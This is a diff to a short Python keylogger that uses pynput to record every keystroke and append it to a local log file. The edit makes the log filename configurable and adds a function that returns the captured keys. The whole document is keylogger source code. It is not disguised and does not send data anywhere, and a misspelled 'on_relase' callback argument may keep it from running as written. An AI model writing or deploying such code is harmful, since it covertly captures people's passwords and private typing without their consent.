@@ -1,7 +1,11 @@
 from pynput import keyboard
 import datetime as dt
+import sys
+import os
 count = 0 #to save after an amount of chars 
 Keys = []
+targetFile = "newwwwwwww.txt"#os.environ.get("targetFile")
+
 def on_press(key):
     global Keys, count
     Keys.append(key)
@@ -21,7 +25,7 @@ def on_relase(key):
 
 def writeFristTime():
     #to write the \n on every logging session 
-    with open("Keylogs2.txt", "a") as fristTime:
+    with open(targetFile, "a") as fristTime:
         fristTime.write("\n")
         fristTime.write("." * 30)
         fristTime.write("\n")
@@ -29,7 +33,7 @@ def writeFristTime():
         fristTime.write("\n")
 
 def write(keys):
-    with open("Keylogs2.txt", "a") as f:
+    with open(targetFile, "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("backspace") > 0:
@@ -40,6 +44,9 @@ def write(keys):
                 f.write("\n")
             elif k.find("Key") == -1:
                 f.write(k)
+
+def getKeys():
+    return Keys
 
 with keyboard.Listener(on_press = on_press , on_relase  = on_relase) as listener:
     listener.join()
